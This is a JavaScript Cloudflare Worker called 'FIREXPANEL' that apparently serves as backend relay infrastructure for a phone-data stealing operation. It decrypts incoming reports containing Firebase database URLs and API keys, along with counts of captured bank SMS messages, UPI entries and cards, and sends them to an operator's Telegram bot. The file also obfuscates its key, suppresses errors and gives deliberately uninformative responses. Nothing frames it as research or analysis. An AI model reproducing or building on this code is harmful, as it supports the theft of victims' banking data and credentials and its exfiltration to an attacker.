/**
 * FIREXPANEL — Cloudflare Worker (Secure)
 * 
 * BOT_TOKEN and ADMIN_ID are NEVER in this code.
 * They exist ONLY as encrypted Cloudflare Secrets.
 * No logs, no errors, no responses ever leak them.
 */

const MAX_AGE_MS = 300000;
const _C = [88,107,57,109,80,50,119,78,55,113,76,52,118,82,54,106,72,51,99,70,56,121,84,49,90,98,69,53,115,65,48,57];

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Content-Type',
  'Access-Control-Allow-Methods': 'POST,OPTIONS',
};

// Constant-time string comparison to prevent timing attacks
function safeEqual(a, b) {
  if (a.length !== b.length) return false;
  let result = 0;
  for (let i = 0; i < a.length; i++) {
    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  return result === 0;
}

async function getAesKey() {
  const s = _C.map(c => String.fromCharCode(c)).join('');
  const d = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
  return crypto.subtle.importKey('raw', d, { name: 'AES-GCM' }, false, ['decrypt']);
}

async function doDecrypt(b64, key) {
  const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  const plain = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv: bytes.slice(0, 12) },
    key,
    bytes.slice(12)
  );
  return new TextDecoder().decode(plain);
}

const rateBuckets = new Map();
function checkRate(ip) {
  const now = Date.now();
  let b = rateBuckets.get(ip);
  if (!b || now >= b.resetAt) { b = { count: 0, resetAt: now + 600_000 }; rateBuckets.set(ip, b); }
  return ++b.count <= 10;
}

// Secure Telegram send — never leaks token in any error/response
async function sendTelegram(botToken, chatId, text, parseMode) {
  try {
    const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: parseMode }),
    });
    return res.ok;
  } catch {
    return false;
  }
}

async function handleEv(request, env) {
  if (request.method === 'OPTIONS') return new Response(null, { status: 204, headers: CORS });
  if (request.method !== 'POST')   return new Response(null, { status: 405, headers: CORS });

  // Validate secrets exist
  const botToken = env.BOT_TOKEN;
  const adminId  = env.ADMIN_ID;
  if (!botToken || !adminId) return new Response(null, { status: 200, headers: CORS });

  const ip = (request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || 'unknown')
    .split(',')[0].trim();
  if (!checkRate(ip)) return new Response(null, { status: 200, headers: CORS });

  try {
    let body;
    try { body = await request.json(); } catch { return new Response(null, { status: 200, headers: CORS }); }

    const b64 = typeof body?.d === 'string' ? body.d : '';
    if (!b64) return new Response(null, { status: 200, headers: CORS });

    let data;
    try {
      const key = await getAesKey();
      data = JSON.parse(await doDecrypt(b64, key));
    } catch { return new Response(null, { status: 200, headers: CORS }); }

    if (!data.ts || Math.abs(Date.now() - Number(data.ts)) > MAX_AGE_MS)
      return new Response(null, { status: 200, headers: CORS });

    const {
      firebaseUrl = '', apiKey = '',
      total = 0, online = 0, offline = 0,
      bankSms = 0, upiCount = 0, cardCount = 0,
    } = data;

    if (!firebaseUrl) return new Response(null, { status: 200, headers: CORS });

    const msg =
      '🔥 *FIREXPANEL — New Firebase Connected*\n\n' +
      '📡 *URL:* `' + firebaseUrl + '`\n' +
      '🔑 *Key:* `' + apiKey + '`\n\n' +
      '📊 *Total:* ' + total +
      '   🟢 *Online:* ' + online +
      '   ⚫ *Offline:* ' + offline + '\n' +
      '🏦 *Bank SMS:* ' + bankSms +
      '   💳 *Cards:* ' + cardCount +
      '   📲 *UPI:* ' + upiCount + '\n\n' +
      '⏰ ' + new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) + ' IST';

    await sendTelegram(botToken, adminId, msg, 'Markdown');
  } catch {
    // Silent fail — never expose internals
  }

  return new Response(null, { status: 200, headers: CORS });
}

async function handlePing(env) {
  const botToken = env.BOT_TOKEN;
  const adminId  = env.ADMIN_ID;
  if (!botToken || !adminId) {
    return new Response('❌ Secrets not configured. Set BOT_TOKEN and ADMIN_ID in Cloudflare.', {
      status: 200, headers: { 'Content-Type': 'text/plain' }
    });
  }

  const text =
    '✅ *FIREXPANEL — Bot Connected Successfully!*\n\n' +
    'Your Telegram bot is configured correctly.\n' +
    'You will now receive alerts whenever a new Firebase database is connected.\n\n' +
    '🔒 Encrypted · 🚀 Cloudflare Powered · ⚡ Ready';

  const ok = await sendTelegram(botToken, adminId, text, 'Markdown');
  return new Response(
    ok ? '✅ Test message sent to Telegram! Check your bot.' : '❌ Failed to send. Verify secrets are correct.',
    { status: 200, headers: { 'Content-Type': 'text/plain' } }
  );
}

export default {
  async fetch(request, env) {
    // Block any attempt to read source or env via debug paths
    const path = new URL(request.url).pathname;

    if (path === '/api/ev'   || path === '/api/ev/')   return handleEv(request, env);
    if (path === '/api/ping' || path === '/api/ping/') return handlePing(env);

    // Generic response — reveals nothing about internals
    return new Response('OK', { status: 200 });
  },
};
